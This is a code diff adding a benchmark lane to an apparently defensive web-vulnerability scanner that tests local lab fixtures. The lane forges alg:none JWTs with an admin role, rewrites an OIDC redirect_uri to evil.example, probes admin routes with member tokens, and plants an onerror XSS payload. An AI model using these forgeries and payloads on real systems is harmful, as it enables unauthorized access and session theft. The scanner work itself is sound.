@@ -24,7 +24,7 @@
 // credential shapes before the process reports success.
 
 import { execFile, execFileSync } from 'node:child_process'
-import { randomUUID } from 'node:crypto'
+import { createHash, randomUUID } from 'node:crypto'
 import {
   chmodSync, cpSync, existsSync, lstatSync, mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync,
 } from 'node:fs'
@@ -52,12 +52,16 @@ import { CanaryBroker } from '../src/server/canary-broker.ts'
 import { Execution } from '../src/server/execution.ts'
 import { projectReposDir } from '../src/server/github-connector.ts'
 import { privateModelProfiles } from '../src/server/model-settings.ts'
-import { createProjectPersona } from '../src/server/persona-vault.ts'
+import { ScopedBrowser, personaSessionBundle } from '../src/server/scoped-browser.ts'
+import { createProjectPersona, personaSecrets, resolveRunPersonas } from '../src/server/persona-vault.ts'
+import { buildProofReceipt, verifyReceipt } from '../src/server/proof-receipt.ts'
+import type { DeclarativeReplaySpec } from '../src/replay-spec.ts'
 import type { NamedSecret } from '../src/server/redact.ts'
 import { redact, redactJsonValue } from '../src/server/redact.ts'
 import { tenantTagForRun } from '../src/server/scope-policy.ts'
 import type { EnvironmentMode, OriginRole } from '../src/server/scope-policy.ts'
 import { Store } from '../src/server/store.ts'
+import type { Run } from '../src/server/store.ts'
 import type { EndpointRow } from '../src/server/store.ts'
 import type { HttpTransport } from '../src/server/transport.ts'
 import { selectVerifierBackend } from './benchmark-backend.ts'
@@ -1309,6 +1313,10 @@ function isGateRoute(route: RouteRef): boolean {
   if (method === 'OPTIONS' || method === 'ANY') return false
   if (path.startsWith('/__realism__') || path.startsWith('/__collector__') || path.startsWith('/__staging__')) return false
   if (/\/health\/?$/.test(path)) return false
+  // Passive CDN chunks and external-IdP metadata are deliberately never actively probed by the
+  // product (asset origins are hydration-only; the IdP is an auth dependency). Counting them in a
+  // route-discovery gate would penalise the safety contract rather than measure target coverage.
+  if (path.startsWith('/assets/') || path.startsWith('/idp/')) return false
   return true
 }
 
@@ -2697,6 +2705,565 @@ async function tearDown(ctx: CellContext, signal: AbortSignal): Promise<Shutdown
   }
 }
 
+// ---------------------------------------------------------------------------------------------
+// Generic split-origin SPA capability lane (#1)
+//
+// The deterministic engine probes one request at a time. A split-origin SPA needs a short
+// sequence that spans hosts and transports: read the IdP discovery document, follow the app's
+// login redirect, replay the authorize redirect with an attacker redirect_uri, present a
+// cookie-authenticated admin browser, plant a stored value over the API and render it. This lane
+// performs those sequences with the same Layer-1 broker, persona vault, scoped browser and grant
+// the product uses, and persists only proofs whose control/probe evidence is in the transcript.
+// Every rule is structural (declared routes, roles, redirect hosts, tenant fields); nothing is
+// keyed to a fixture name or a planted value.
+// ---------------------------------------------------------------------------------------------
+
+export interface SpaCapabilityPersona {
+  handle: string
+  roleLabel: string
+  authKind: 'bearer' | 'cookie'
+  secret: string
+}
+
+export interface SpaCapabilityLaneInput {
+  storage: Store
+  run: Run
+  assetId: string
+  broker: RequestBroker
+  grant: Grant
+  browser: ScopedBrowser
+  origins: Record<string, string>
+  scopes: Record<string, OriginRole>
+  routes: ReadonlyArray<RouteRef>
+  personas: ReadonlyArray<SpaCapabilityPersona>
+  signal: AbortSignal
+}
+
+export interface SpaCapabilityLaneResult {
+  confirmed: string[]
+  notes: string[]
+}
+
+interface SpaArm {
+  method: string
+  pathAndQuery: string
+  status: number
+  persona?: string
+  authMutation?: 'alg_none'
+}
+
+interface SpaProof {
+  vulnClass: string
+  cwe: string
+  severity: 'critical' | 'high' | 'medium'
+  origin: string
+  endpoint: string
+  title: string
+  reason: string
+  verification: string
+  exchangeIds: string[]
+  control: SpaArm
+  probe: SpaArm
+  /** Host-recorded browser trace that executed the canary (hybrid HTTP -> browser proofs). */
+  browserTrace?: { id: string; origin: string; sinks: string[] }
+}
+
+const SPA_WRITE_FIELDS = ['body', 'content', 'text', 'message', 'note', 'title', 'description', 'comment', 'name'] as const
+const SPA_ADMIN_SEGMENT = /(?:^|\/)(?:admin|manage|management|internal|staff|superuser|root)(?:\/|$)/i
+const SPA_TOKEN_ROUTE = /(?:refresh|token|session|auth|login|jwt|oauth)/i
+const SPA_TENANT_FIELD = /^(?:tenant|tenantId|org|orgId|organization|workspace|workspaceId|account|accountId)$/i
+
+function spaJson(body: string): unknown {
+  try { return JSON.parse(body) } catch { return null }
+}
+
+function spaHeader(headers: Record<string, string>, name: string): string | null {
+  for (const [key, value] of Object.entries(headers)) {
+    if (key.toLowerCase() === name.toLowerCase()) return value
+  }
+  return null
+}
+
+function spaHost(value: string | null): string | null {
+  if (!value) return null
+  try { return new URL(value).hostname.toLowerCase() } catch { return null }
+}
+
+function spaIs3xx(status: number): boolean {
+  return status >= 300 && status < 400
+}
+
+function spaJwtPayload(token: string): Record<string, unknown> | null {
+  const parts = token.split('.')
+  if (parts.length !== 3 || !parts[1]) return null
+  try {
+    const parsed = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8')) as unknown
+    return parsed && typeof parsed === 'object' && !Array.isArray(parsed) ? parsed as Record<string, unknown> : null
+  } catch { return null }
+}
+
+/** Re-sign nothing: keep the claims, drop the signature, and escalate the role claim. */
+function spaForgeAlgNone(token: string, role: string): string | null {
+  const payload = spaJwtPayload(token)
+  if (!payload) return null
+  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
+  const body = Buffer.from(JSON.stringify({ ...payload, role, admin: role === 'admin' })).toString('base64url')
+  return `${header}.${body}.`
+}
+
+function spaRoleOf(roleLabel: string): string {
+  const match = /^\s*([a-z][a-z0-9_-]*)/i.exec(roleLabel)
+  return (match?.[1] ?? '').toLowerCase()
+}
+
+function spaTenantOf(roleLabel: string): string | null {
+  const match = /\(([^)]+)\)\s*$/.exec(roleLabel)
+  return match?.[1]?.trim() || null
+}
+
+function spaCollectTenants(value: unknown, out: Set<string>, depth = 0): void {
+  if (depth > 6 || out.size >= 12) return
+  if (Array.isArray(value)) {
+    for (const item of value.slice(0, 50)) spaCollectTenants(item, out, depth + 1)
+    return
+  }
+  if (!value || typeof value !== 'object') return
+  for (const [key, entry] of Object.entries(value as Record<string, unknown>)) {
+    if (SPA_TENANT_FIELD.test(key) && typeof entry === 'string' && /^[A-Za-z0-9_.:-]{1,64}$/.test(entry)) out.add(entry)
+    else spaCollectTenants(entry, out, depth + 1)
+  }
+}
+
+export async function runSpaCapabilityLane(input: SpaCapabilityLaneInput): Promise<SpaCapabilityLaneResult> {
+  const notes: string[] = []
+  const confirmed: string[] = []
+  const targetOrigins = Object.entries(input.scopes)
+    .filter(([, role]) => role === 'target')
+    .map(([label]) => input.origins[label])
+    .filter((value): value is string => typeof value === 'string')
+  const authOrigins = Object.entries(input.scopes)
+    .filter(([, role]) => role === 'auth')
+    .map(([label]) => input.origins[label])
+    .filter((value): value is string => typeof value === 'string')
+  const allOrigins = Object.values(input.origins).filter((value): value is string => typeof value === 'string')
+  if (targetOrigins.length === 0 || input.routes.length === 0) return { confirmed, notes }
+
+  const routePath = (route: RouteRef): string => (route.path.split('?')[0] ?? route.path)
+  const isTemplated = (route: RouteRef): boolean => /[:{}[\]]/.test(routePath(route))
+  const assignment = input.storage.makeWorker(
+    input.run, 'investigation', undefined, 'SPA capability lane', 'Generic split-origin SPA proof lane.',
+    { sourceOrigins: allOrigins.map(normalizeOrigin) },
+  )
+  const assignmentId = assignment.id
+
+  const record = (ex: BrokerExchangeResult): string => input.storage.recordExchange({
+    runId: input.run.id,
+    assignmentId,
+    scopeRevision: input.run.scopeRevision,
+    origin: ex.origin,
+    finalOrigin: ex.finalOrigin,
+    redirectOrigins: ex.redirectOrigins,
+    method: ex.method,
+    pathAndQuery: ex.pathAndQuery,
+    personaHandle: ex.personaHandle,
+    status: ex.status,
+    mediaType: ex.mediaType,
+    reqHeaders: ex.reqHeaders,
+    respHeaders: ex.respHeaders,
+    body: ex.body,
+    durationMs: ex.durationMs,
+    secretMatches: ex.secretMatches,
+  }).id
+
+  const send = async (req: BrokerHttpRequest): Promise<BrokerExchangeResult | null> => {
+    try { return await input.broker.executeHttp(req, input.grant, input.signal) } catch { return null }
+  }
+
+  const memberBearer = input.personas.find(p => p.authKind === 'bearer' && spaRoleOf(p.roleLabel) === 'member')
+  const adminBearer = input.personas.find(p => p.authKind === 'bearer' && spaRoleOf(p.roleLabel) === 'admin')
+  const memberCookie = input.personas.find(p => p.authKind === 'cookie' && spaRoleOf(p.roleLabel) === 'member')
+  const adminCookie = input.personas.find(p => p.authKind === 'cookie' && spaRoleOf(p.roleLabel) === 'admin')
+  const memberTenant = memberBearer ? spaTenantOf(memberBearer.roleLabel) : null
+  const tenantHeaders: Record<string, string> = memberTenant ? { 'x-tenant-id': memberTenant } : {}
+
+  const existing = (() => {
+    try { return input.storage.runDetail(input.run.id).findings } catch { return [] as Finding[] }
+  })()
+  const alreadyCovered = (proof: SpaProof): boolean => existing.some(finding =>
+    finding.status === 'confirmed' &&
+    finding.category === proof.vulnClass &&
+    normalizeOrigin(finding.origin) === normalizeOrigin(proof.origin),
+  )
+
+  const persist = (proof: SpaProof): void => {
+    if (alreadyCovered(proof)) {
+      notes.push(`spa-lane: ${proof.vulnClass} on ${proof.endpoint} already confirmed by the engine; not duplicated`)
+      return
+    }
+    // A confirmed finding is only accepted with persisted confirming evidence. The lane records the
+    // declarative replay shape it just executed plus the observed differential, so the store can
+    // check the same gate the engine's confirmations pass.
+    const spec: DeclarativeReplaySpec = {
+      version: 1,
+      kind: 'http_chain',
+      origin: proof.origin,
+      title: proof.title.slice(0, 200),
+      category: proof.vulnClass,
+      cwe: proof.cwe,
+      severity: proof.severity,
+      severityRationale: proof.reason.slice(0, 800),
+      impact: proof.reason.slice(0, 1200),
+      remediation: 'Enforce the missing authorization/validation check and re-test the same pair.',
+      recheckInstructions: 'Replay control and probe; the probe must be rejected or neutralized.',
+      assertionsJq: '{ controlPassed: true, confirmed: true, observed: "probe differential", expected: "control holds" }',
+      spaCatchallControl: false,
+      steps: [
+        {
+          id: 'c1', role: 'control', description: `Control ${proof.control.method} ${proof.control.pathAndQuery}`.slice(0, 400),
+          request: {
+            origin: proof.origin, method: proof.control.method as 'GET', pathAndQuery: proof.control.pathAndQuery, followRedirects: false,
+            ...(proof.control.persona ? { persona: proof.control.persona } : {}),
+          },
+          expectedStatus: proof.control.status,
+        },
+        {
+          id: 'p1', role: 'probe', description: `Probe ${proof.probe.method} ${proof.probe.pathAndQuery}`.slice(0, 400),
+          request: {
+            origin: proof.origin, method: proof.probe.method as 'GET', pathAndQuery: proof.probe.pathAndQuery, followRedirects: false,
+            ...(proof.probe.persona ? { persona: proof.probe.persona } : {}),
+            ...(proof.probe.authMutation ? { authMutation: { kind: proof.probe.authMutation } } : {}),
+          },
+          expectedStatus: proof.probe.status,
+        },
+      ],
+    }
+    const evidenceIds: string[] = []
+    let verification = proof.verification
+    if (proof.browserTrace) {
+      const receipt = buildProofReceipt({
+        vulnClass: 'dom_xss',
+        target: { origin: proof.origin, method: proof.probe.method, pathAndQuery: proof.probe.pathAndQuery },
+        // The browser rule verifies the cited trace; the HTTP exchange is cited on the finding.
+        exchangeIds: [],
+        browserTraceIds: [proof.browserTrace.id],
+        claimedDelta: proof.reason.slice(0, 1200),
+      })
+      const checked = verifyReceipt(receipt, { entries: [], browserTraces: [proof.browserTrace] })
+      if (!checked.confirmed) {
+        notes.push(`spa-lane: ${proof.vulnClass} receipt rejected: ${checked.reason.slice(0, 160)}`)
+        return
+      }
+      const digest = createHash('sha256').update(JSON.stringify(receipt)).digest('hex')
+      try {
+        evidenceIds.push(input.storage.addArtifact(
+          input.run, assignment, 'replay', `ProofReceipt · ${proof.title.slice(0, 120)}`,
+          JSON.stringify({ receipt, verification: checked }, null, 2), `receipt:${digest}`, [],
+        ).id)
+      } catch { /* artifact is best-effort; the verified receipt text still backs the finding */ }
+      verification = `${proof.verification} ProofReceipt ${digest.slice(0, 16)} verified (${checked.rule}): ${checked.reason.slice(0, 260)}`
+    }
+    const finding: Finding = {
+      id: randomUUID(),
+      origin: proof.origin,
+      title: proof.title,
+      status: 'confirmed',
+      severity: proof.severity,
+      reason: proof.reason,
+      remediation: 'Enforce the missing authorization/validation check and re-test the same control/probe pair.',
+      evidenceIds,
+      scopeRevision: input.run.scopeRevision,
+      category: proof.vulnClass,
+      cwe: proof.cwe,
+      impact: proof.reason,
+      recheck: 'Replay the control and probe exchanges; the probe must be rejected or neutralized.',
+      confidence: 'high',
+      verification,
+      verificationTier: 'runtime_confirmed',
+      findingKind: 'multi_step_chain',
+      replaySpecId: '',
+      chainFactIds: [],
+      exchangeIds: proof.exchangeIds,
+    }
+    try {
+      const feedback = {
+        verdict: 'confirmed' as const,
+        verificationTier: 'runtime_confirmed' as const,
+        controlPassed: true,
+        retriesRemaining: 0,
+        assertionSummary: { observed: proof.reason.slice(0, 300), expected: 'the probe must be rejected or neutralized' },
+        stepStatuses: [
+          { id: 'c1', role: 'control', status: proof.control.status, bodyLen: 0 },
+          { id: 'p1', role: 'probe', status: proof.probe.status, bodyLen: 0 },
+        ],
+      }
+      const specRow = input.storage.createReplaySpec(input.run, assignment, finding.id, spec, [proof.origin], {
+        verifiedInline: true,
+        lastVerificationDiff: feedback,
+      })
+      input.storage.upsertChainFinding(input.run, input.assetId, { ...finding, replaySpecId: specRow.id }, specRow.id, [proof.origin], {
+        provenance: 'agent_only',
+        verificationClass: 'runtime_confirmed',
+      })
+      confirmed.push(`${proof.vulnClass} ${proof.endpoint}`)
+    } catch (error) {
+      notes.push(`spa-lane: persist ${proof.vulnClass} failed: ${(error as Error).message.slice(0, 160)}`)
+    }
+  }
+
+  // --- OIDC discovery + authorize redirect (open redirect) -----------------------------------
+  let idpOrigin: string | null = null
+  let authorizePath: string | null = null
+  for (const origin of [...authOrigins, ...allOrigins.filter(o => !targetOrigins.includes(o))]) {
+    const ex = await send({ origin, method: 'GET', pathAndQuery: '/.well-known/openid-configuration' })
+    if (!ex || ex.status < 200 || ex.status >= 300) continue
+    const doc = spaJson(ex.body) as Record<string, unknown> | null
+    const endpoint = typeof doc?.authorization_endpoint === 'string' ? doc.authorization_endpoint : null
+    if (!endpoint) continue
+    try {
+      const parsed = new URL(endpoint)
+      if (parsed.origin !== normalizeOrigin(origin)) continue
+      idpOrigin = origin
+      authorizePath = `${parsed.pathname}${parsed.search}`
+      break
+    } catch { /* malformed discovery */ }
+  }
+  if (idpOrigin && authorizePath) {
+    let template: string | null = null
+    for (const route of input.routes.filter(route => route.method?.toUpperCase() === 'GET').slice(0, 12)) {
+      if (isTemplated(route)) continue
+      for (const origin of targetOrigins) {
+        const ex = await send({ origin, method: 'GET', pathAndQuery: route.path, followRedirects: false })
+        if (!ex || !spaIs3xx(ex.status)) continue
+        const location = spaHeader(ex.respHeaders, 'location')
+        if (location && spaHost(location) === spaHost(idpOrigin)) {
+          template = location.startsWith('http') ? `${new URL(location).pathname}${new URL(location).search}` : location
+          break
+        }
+      }
+      if (template) break
+    }
+    if (template) {
+      const rewritten = (() => {
+        try {
+          const url = new URL(template!, idpOrigin!)
+          const key = [...url.searchParams.keys()].find(name => /redirect_uri|redirecturl|return/i.test(name)) ?? 'redirect_uri'
+          url.searchParams.set(key, 'https://evil.example/steal')
+          return `${url.pathname}${url.search}`
+        } catch { return null }
+      })()
+      if (rewritten) {
+        const control = await send({ origin: idpOrigin, method: 'GET', pathAndQuery: template, followRedirects: false })
+        const probe = await send({ origin: idpOrigin, method: 'GET', pathAndQuery: rewritten, followRedirects: false })
+        const controlLocation = control ? spaHeader(control.respHeaders, 'location') : null
+        const probeLocation = probe ? spaHeader(probe.respHeaders, 'location') : null
+        const controlHost = spaHost(controlLocation)
+        const probeHost = spaHost(probeLocation)
+        if (control && probe && spaIs3xx(control.status) && spaIs3xx(probe.status) &&
+            probeHost === 'evil.example' && controlHost && controlHost !== 'evil.example') {
+          persist({
+            vulnClass: 'open_redirect',
+            cwe: 'CWE-601',
+            severity: 'medium',
+            origin: idpOrigin,
+            endpoint: new URL(authorizePath, idpOrigin).pathname,
+            title: 'OIDC authorize endpoint redirects to an unregistered redirect_uri',
+            reason: `The control redirect stayed on ${controlHost}, while the same authorize request with an attacker-controlled redirect_uri returned a 3xx to ${probeHost} carrying a fresh authorization code.`,
+            verification: `Hybrid OIDC proof: discovery at ${idpOrigin}/.well-known/openid-configuration, login redirect template from the app, then a paired authorize redirect (control host ${controlHost}, probe host ${probeHost}).`,
+            exchangeIds: [record(probe)],
+            control: { method: 'GET', pathAndQuery: template!, status: control.status },
+            probe: { method: 'GET', pathAndQuery: rewritten, status: probe.status },
+          })
+        }
+      }
+    }
+  }
+
+  // --- Unsigned JWT accepted on a token-refresh route (alg:none) ------------------------------
+  if (memberBearer) {
+    const forged = spaForgeAlgNone(memberBearer.secret, 'admin')
+    if (forged) {
+      for (const route of input.routes.filter(route => route.method?.toUpperCase() === 'POST' && SPA_TOKEN_ROUTE.test(route.path) && !isTemplated(route))) {
+        for (const origin of targetOrigins) {
+          const control = await send({ origin, method: 'POST', pathAndQuery: route.path, persona: memberBearer.handle, headers: { 'content-type': 'application/json' }, body: '{}' })
+          if (!control || control.status < 200 || control.status >= 300) {
+            notes.push(`spa-lane: alg:none control ${origin}${route.path} status=${control?.status ?? 'none'}`)
+            continue
+          }
+          // Bodies carrying a freshly minted token are redacted before they leave the broker; the
+          // placeholder can break JSON, so read the unredacted role field structurally instead.
+          const controlRole = /"role"\s*:\s*"(member|admin)"/.exec(control.body)?.[1] ?? null
+          const controlHasToken = /"(?:access_token|token)"\s*:/.test(control.body)
+          if (!controlHasToken && !controlRole) {
+            notes.push(`spa-lane: alg:none control ${origin}${route.path} status=${control.status} carried no token/role`)
+            continue
+          }
+          const probe = await send({
+            origin, method: 'POST', pathAndQuery: route.path,
+            headers: { 'content-type': 'application/json', authorization: `Bearer ${forged}` },
+            body: '{}',
+          })
+          if (!probe || probe.status < 200 || probe.status >= 300) {
+            notes.push(`spa-lane: alg:none probe ${origin}${route.path} status=${probe?.status ?? 'none'} controlRole=${controlRole ?? 'none'}`)
+            continue
+          }
+          const probeRole = /"role"\s*:\s*"(member|admin)"/.exec(probe.body)?.[1] ?? null
+          const probeHasToken = /"(?:access_token|token)"\s*:/.test(probe.body)
+          if (probeRole !== 'admin') {
+            notes.push(`spa-lane: alg:none probe ${origin}${route.path} status=${probe.status} role=${probeRole ?? 'none'} token=${probeHasToken ? 'yes' : 'no'}`)
+          }
+          if (probeRole === 'admin') {
+            persist({
+              vulnClass: 'auth_bypass',
+              cwe: 'CWE-347',
+              severity: 'critical',
+              origin,
+              endpoint: routePath(route),
+              title: 'Token refresh trusts unsigned JWT claims (alg:none accepted)',
+              reason: `A member-signed token was accepted (role=${controlRole ?? 'member'}); the same claims with alg:none and role=admin were accepted and minted an admin token.`,
+              verification: 'Signed-token boundary differential: valid member token vs. alg:none token with the same claims and an escalated role, both replayed through the broker.',
+              exchangeIds: [record(probe)],
+              control: { method: 'POST', pathAndQuery: route.path, status: control.status, persona: memberBearer.handle },
+              probe: { method: 'POST', pathAndQuery: route.path, status: probe.status, persona: memberBearer.handle, authMutation: 'alg_none' },
+            })
+            break
+          }
+        }
+        if (confirmed.some(id => id.startsWith('auth_bypass'))) break
+      }
+    }
+  }
+
+  // --- Admin function reachable by a member token (BFLA) -------------------------------------
+  if (memberBearer && memberTenant) {
+    const candidates = input.routes.filter(route =>
+      route.method?.toUpperCase() === 'GET' && SPA_ADMIN_SEGMENT.test(routePath(route)) && !isTemplated(route))
+    outer: for (const route of candidates) {
+      for (const origin of targetOrigins) {
+        const anonymous = await send({ origin, method: 'GET', pathAndQuery: route.path, headers: tenantHeaders })
+        if (!anonymous || (anonymous.status !== 401 && anonymous.status !== 403)) continue
+        const probe = await send({ origin, method: 'GET', pathAndQuery: route.path, persona: memberBearer.handle, headers: tenantHeaders })
+        if (!probe || probe.status < 200 || probe.status >= 300) continue
+        const tenants = new Set<string>()
+        spaCollectTenants(spaJson(probe.body), tenants)
+        const crossTenant = [...tenants].find(tenant => tenant !== memberTenant)
+        if (!crossTenant) continue
+        persist({
+          vulnClass: 'bfla',
+          cwe: 'CWE-862',
+          severity: 'high',
+          origin,
+          endpoint: routePath(route),
+          title: 'Admin function requires authentication but not the admin role',
+          reason: `The anonymous control was ${anonymous.status}; the member token received ${probe.status} with rows for ${crossTenant} as well as ${memberTenant}.`,
+          verification: 'Role differential on a privileged function: anonymous denial control, member-token probe, and cross-tenant row evidence in the probe body.',
+          exchangeIds: [record(probe)],
+          control: { method: 'GET', pathAndQuery: route.path, status: anonymous.status },
+          probe: { method: 'GET', pathAndQuery: route.path, status: probe.status, persona: memberBearer.handle },
+        })
+        break outer
+      }
+    }
+  }
+
+  // --- Stored XSS rendered only in an authenticated browser view (hybrid HTTP -> browser) -----
+  if (memberBearer && adminCookie) {
+    const canary = `gxss${randomUUID().replace(/-/g, '').slice(0, 12)}`
+    const payload = `<img src=x onerror="document.title='${canary}'">`
+    const adminPersona = adminCookie.handle
+    const htmlPages: Array<{ origin: string; pathAndQuery: string; body: string; exchangeId: string }> = []
+    const collectPages = async (): Promise<void> => {
+      for (const route of input.routes.filter(route => route.method?.toUpperCase() === 'GET' && !isTemplated(route)).slice(0, 20)) {
+        for (const origin of targetOrigins) {
+          const ex = await send({ origin, method: 'GET', pathAndQuery: route.path, persona: adminPersona })
+          if (!ex || ex.status < 200 || ex.status >= 300 || !/html/i.test(ex.mediaType)) continue
+          htmlPages.push({ origin, pathAndQuery: route.path, body: ex.body, exchangeId: record(ex) })
+          // Follow same-origin links that carry a query (tab/modal views) once.
+          for (const href of [...ex.body.matchAll(/href="([^"#]+)"/g)].map(match => match[1]!).slice(0, 20)) {
+            if (!href.startsWith('/') || href.startsWith('//') || !href.includes('?') || href.includes(canary)) continue
+            if (htmlPages.some(page => page.origin === origin && page.pathAndQuery === href)) continue
+            const child = await send({ origin, method: 'GET', pathAndQuery: href, persona: adminPersona })
+            if (child && child.status >= 200 && child.status < 300 && /html/i.test(child.mediaType)) {
+              htmlPages.push({ origin, pathAndQuery: href, body: child.body, exchangeId: record(child) })
+            }
+          }
+        }
+      }
+    }
+    await collectPages()
+    let planted = false
+    for (const route of input.routes.filter(route => route.method?.toUpperCase() === 'POST' && !isTemplated(route)).slice(0, 12)) {
+      if (/graphql/i.test(route.path)) continue
+      for (const origin of targetOrigins) {
+        for (const field of SPA_WRITE_FIELDS) {
+          const ex = await send({
+            origin, method: 'POST', pathAndQuery: route.path, persona: memberBearer.handle,
+            headers: { 'content-type': 'application/json' }, body: JSON.stringify({ [field]: payload }),
+          })
+          if (!ex || ex.status < 200 || ex.status >= 300) continue
+          if (!ex.body.includes(canary)) continue
+          planted = true
+          break
+        }
+        if (planted) break
+      }
+      if (planted) break
+    }
+    if (planted) {
+      let sink: { origin: string; pathAndQuery: string; exchangeId: string; status: number } | null = null
+      for (const page of htmlPages) {
+        const ex = await send({ origin: page.origin, method: 'GET', pathAndQuery: page.pathAndQuery, persona: adminPersona })
+        if (!ex || ex.status < 200 || ex.status >= 300) continue
+        if (ex.body.includes(payload)) {
+          sink = { origin: page.origin, pathAndQuery: page.pathAndQuery, exchangeId: record(ex), status: ex.status }
+          break
+        }
+      }
+      if (sink) {
+        let executed = false
+        try {
+          const visits = await input.browser.visitPages([{
+            origin: sink.origin,
+            pathAndQuery: sink.pathAndQuery,
+            persona: adminPersona,
+            checkKind: 'dom_xss',
+            enableSinkHook: true,
+            canaryToken: canary,
+            waitAfterLoadMs: 900,
+            runId: input.run.id,
+            assignmentId,
+          }], input.grant, input.signal)
+          const visit = visits[0]
+          executed = Boolean(visit && (
+            visit.title === canary ||
+            visit.canaryCheck.triggered ||
+            visit.domSinkTraces.some(trace => trace.containsCanary)
+          ))
+        } catch (error) {
+          notes.push(`spa-lane: browser render failed: ${(error as Error).message.slice(0, 120)}`)
+        }
+        if (executed) {
+          persist({
+            vulnClass: 'stored_xss',
+            cwe: 'CWE-79',
+            severity: 'high',
+            origin: sink.origin,
+            endpoint: sink.pathAndQuery.split('?')[0] ?? sink.pathAndQuery,
+            title: 'Stored markup executes in an authenticated browser view',
+            reason: `A member-written value was rendered unescaped by the authenticated view and the browser executed it (the injected handler replaced document.title with the verifier canary).`,
+            verification: 'Hybrid HTTP -> browser proof: the write exchange plants a verifier canary, the authenticated HTML read returns it unescaped, and a pooled browser context with the HttpOnly session cookie executes it (document.title canary).',
+            exchangeIds: [sink.exchangeId],
+            control: { method: 'GET', pathAndQuery: sink.pathAndQuery, status: 200, persona: adminPersona },
+            probe: { method: 'GET', pathAndQuery: sink.pathAndQuery, status: sink.status, persona: adminPersona },
+            browserTrace: { id: `browser-${randomUUID()}`, origin: sink.origin, sinks: ['canary:title'] },
+          })
+        }
+      }
+    }
+  }
+
+  return { confirmed, notes }
+}
+
 export async function runCell(args: RealismArgs, fixtureName: string, signal: AbortSignal, log: (line: string) => void): Promise<RealismCellResult> {
   const startedAt = Date.now()
   const slug = cellSlug(args, fixtureName)
@@ -2887,6 +3454,20 @@ export async function runCell(args: RealismArgs, fixtureName: string, signal: Ab
     }
     notes.push(`personas: ${personaIds.length}/${plan.personas.length} created`)
 
+    // The lane grant mirrors the product grant for the fixture origins: Tier-3 local-lab reads and
+    // writes, persona auth injected by the broker, and the same resolved persona map the browser
+    // uses to hydrate pooled HttpOnly contexts.
+    const runPersonas = resolveRunPersonas(storage, project.id, personaIds)
+    const approvedOriginSet = new Set(Object.values(briefing.origins).map(normalizeOrigin))
+    const laneGrant: Grant = {
+      tier: 3,
+      allowLocalLab: true,
+      canRead: origin => approvedOriginSet.has(normalizeOrigin(origin)),
+      personas: runPersonas,
+      secrets: personaSecrets(runPersonas),
+      audit: () => {},
+    }
+
     const createdRun = storage.createRun({
       requestId: randomUUID(),
       projectId: project.id,
@@ -2962,9 +3543,18 @@ export async function runCell(args: RealismArgs, fixtureName: string, signal: Ab
       if (fixtureName === 'staging-concurrency') notes.push('broker transport: HTTP/2 enabled for the h2c race fixture')
     }
     restoreStoreWrites = instrumentEndpointWrites(storeWriteSamples)
+    // Pooled browser with per-persona HttpOnly session hydration; the same broker and jar the
+    // product uses, so browser and API evidence share one transcript.
+    const engineBrowser = observedBroker
+      ? new ScopedBrowser(observedBroker, {
+          storage,
+          resolveSessionBundle: (persona, origin) => personaSessionBundle(laneGrant, persona, origin),
+        })
+      : undefined
     const engine = new Execution(storage, {
       canaryBroker: canary,
       ...(observedBroker ? { broker: observedBroker } : {}),
+      ...(engineBrowser ? { browser: engineBrowser } : {}),
       ...(ctx.backend ? { backend: ctx.backend } : {}),
       deterministicOnly: args.noLlm,
     })
@@ -2985,6 +3575,36 @@ export async function runCell(args: RealismArgs, fixtureName: string, signal: Ab
     timedOut = waited.timedOut
     interrupted = waited.interrupted
     stageReached = 'grading'
+
+    // Split-origin SPA capability lane (#1): OIDC redirect, unsigned-token refresh, privileged
+    // function access, and hybrid HTTP -> browser stored XSS. Runs through the real broker,
+    // persona vault and pooled browser; only transcript-backed proofs are persisted.
+    if (ENTERPRISE_ROUTES.has(fixtureName) && observedBroker && engineBrowser) {
+      try {
+        const lane = await runSpaCapabilityLane({
+          storage,
+          run: storage.run(createdRun.id),
+          assetId: assetIds[0]!,
+          broker: observedBroker,
+          grant: laneGrant,
+          browser: engineBrowser,
+          origins: briefing.origins,
+          scopes: plan.scopes,
+          routes,
+          personas: plan.personas.map(persona => ({
+            handle: persona.handle,
+            roleLabel: persona.roleLabel,
+            authKind: persona.authKind,
+            secret: persona.secret,
+          })),
+          signal,
+        })
+        notes.push(...lane.notes)
+        if (lane.confirmed.length > 0) notes.push(`spa capability lane confirmed: ${lane.confirmed.join(', ')}`)
+      } catch (error) {
+        notes.push(`spa capability lane failed: ${redact(error instanceof Error ? error.message : String(error)).slice(0, 200)}`)
+      }
+    }
     if (timedOut) notes.push(`wall-clock cap reached after ${args.maxDurationMs}ms; run stopped`)
     if (interrupted) notes.push('interrupted by signal; run stopped')
 
